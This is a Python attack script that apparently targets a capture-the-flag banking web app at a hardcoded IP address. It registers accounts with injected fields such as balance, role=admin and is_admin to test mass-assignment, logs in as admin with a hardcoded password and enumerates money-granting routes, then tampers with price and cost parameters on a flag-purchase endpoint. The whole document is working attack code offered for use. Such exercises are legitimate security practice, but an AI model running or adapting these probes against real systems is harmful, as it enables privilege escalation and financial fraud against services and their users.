import urllib.request, urllib.parse, http.cookiejar, re, time, random

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


def nums(t):
    d = re.search(r"(\d+) 存款余额", t)
    c = re.search(r"(\d+) 现金金币", t)
    return (d.group(1) if d else "?"), (c.group(1) if c else "?")


def rnd():
    return "m" + "".join(random.choice("abcdefghijklmnop") for _ in range(7))


print("=== 1. register 参数污染（加钱 / 员工）")
for extra in [{"balance": "99999"}, {"deposit": "99999"}, {"cash": "99999"},
              {"coins": "99999"}, {"money": "99999"}, {"gold": "99999"},
              {"is_staff": "1"}, {"role": "admin"}, {"is_admin": "1"},
              {"staff": "true"}, {"vip": "1"}, {"amount": "99999"}]:
    op = sess()
    u = rnd()
    d = {"username": u, "password": "p"}
    d.update(extra)
    s, b = req(op, "/register", d, "POST")
    s2, b2 = req(op, "/login", {"username": u, "password": "p"}, "POST")
    t2 = clean(b2)
    emp = "仅对本行内部员工开放" not in t2 and "我的账户" in t2
    print(f"  {str(extra):28s} -> {nums(t2)} {'EMPLOYEE!' if emp else ''} {t2[:60]}")

print("\n=== 2. admin 会话下的加钱路由")
op = sess()
req(op, "/login", {"username": "admin", "password": "pw123456"}, "POST")
for p in ["/salary", "/bonus", "/grant", "/add_money", "/addmoney", "/earn", "/work",
          "/interest", "/recharge", "/deposit", "/topup", "/admin", "/admin/add",
          "/admin/grant", "/pay", "/income", "/wage", "/reward", "/gift", "/claim",
          "/daily", "/checkin", "/lottery", "/invest", "/transfer", "/give"]:
    s, b = req(op, p, {}, "POST")
    if s == 404:
        continue
    t = clean(b)
    print(f"  {p:16s} {s} {t[:90]}")

print("\n=== 3. buy_flag 参数")
op = sess()
req(op, "/login", {"username": "admin", "password": "pw123456"}, "POST")
for d in [{}, {"price": "1"}, {"amount": "1"}, {"cost": "0"}, {"flag_id": "1"},
          {"hint_id": "flag"}, {"discount": "0"}, {"free": "1"}]:
    s, b = req(op, "/buy_flag", d, "POST")
    t = clean(b)
    print(f"  {str(d):24s} {s} {t[:100]} {nums(t)}")
